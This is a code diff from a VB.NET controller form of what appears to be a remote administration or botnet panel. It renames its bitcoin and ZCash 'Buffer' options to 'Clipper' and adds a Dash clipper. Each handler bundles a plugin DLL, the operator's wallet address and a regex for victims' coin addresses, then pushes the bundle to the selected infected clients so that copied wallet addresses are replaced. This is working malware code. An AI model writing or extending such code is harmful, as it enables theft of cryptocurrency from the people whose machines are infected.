@@ -1444,7 +1444,7 @@ Public Class form1
     Private Sub toolStripMenuItem65_Click(sender As Object, e As EventArgs) Handles toolStripMenuItem65.Click
         If l1.SelectedItems.Count > 0 Then
             Try
-                Dim message As Object = InputBox("Enter your address", "BTC Buffer", "Your BTC address")
+                Dim message As Object = InputBox("Enter your address", "BTC Clipper", "Your BTC address")
                 If Not String.IsNullOrWhiteSpace(message) Then
                     Dim B As Byte() = SB("Cilpper" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class48.dll")) & Gclass1.SPL & message & Gclass1.SPL & "\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,45}\b")
                     For Each C As ListViewItem In l1.SelectedItems
@@ -1461,7 +1461,7 @@ Public Class form1
     Private Sub toolStripMenuItem66_Click(sender As Object, e As EventArgs) Handles toolStripMenuItem66.Click
         If l1.SelectedItems.Count > 0 Then
             Try
-                Dim message As Object = InputBox("Enter your address", "ZCash Buffer", "Your ZCash address")
+                Dim message As Object = InputBox("Enter your address", "ZCash Clipper", "Your ZCash address")
                 If Not String.IsNullOrWhiteSpace(message) Then
                     Dim B As Byte() = SB("Cilpper" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class48.dll")) & Gclass1.SPL & message & Gclass1.SPL & "t1[0-9A-z]{33}")
                     For Each C As ListViewItem In l1.SelectedItems
@@ -1732,5 +1732,22 @@ Public Class form1
 
     Private Sub form1_InputLanguageChanging(sender As Object, e As InputLanguageChangingEventArgs) Handles MyBase.InputLanguageChanging
 
+    End Sub
+
+    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
+        If l1.SelectedItems.Count > 0 Then
+            Try
+                Dim message As Object = InputBox("Enter your address", "Dash Clipper", "Your Dash Address")
+                If Not String.IsNullOrWhiteSpace(message) Then
+                    Dim B As Byte() = SB("Cilpper" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class48.dll")) & Gclass1.SPL & message & Gclass1.SPL & "(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)")
+                    For Each C As ListViewItem In l1.SelectedItems
+                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
+                        Pending.Req_Out.Add(ClientReq)
+                    Next
+                End If
+            Catch ex As Exception
+                MessageBox.Show(ex.Message)
+            End Try
+        End If
     End Sub
 End Class
